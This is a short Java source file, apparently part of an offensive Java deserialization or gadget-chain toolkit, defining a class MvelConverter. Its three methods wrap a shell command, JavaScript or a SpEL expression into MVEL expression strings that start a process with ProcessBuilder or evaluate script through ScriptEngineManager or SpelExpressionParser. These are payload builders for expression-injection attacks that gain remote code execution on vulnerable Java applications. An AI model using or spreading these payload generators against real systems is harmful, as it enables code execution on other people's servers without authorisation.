package com.h2tg.ysogate.bullet.defineClass;

public class MvelConverter
{
    public static String mvel2cmd(String cmd)
    {
        String code="new java.lang.ProcessBuilder(new java.lang.String[]{\""+cmd+"\"}).start()";
        return code;
    }

    public static String mvel2js(String js)
    {
        String code="new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(\""+js+"\");";
        return code;
    }

    public static String mvel2spel(String spel)
    {
        String code="new org.springframework.expression.spel.standard.SpelExpressionParser().parseExpression(\""+spel+"\").getValue().toString()";
        return code;
    }
}
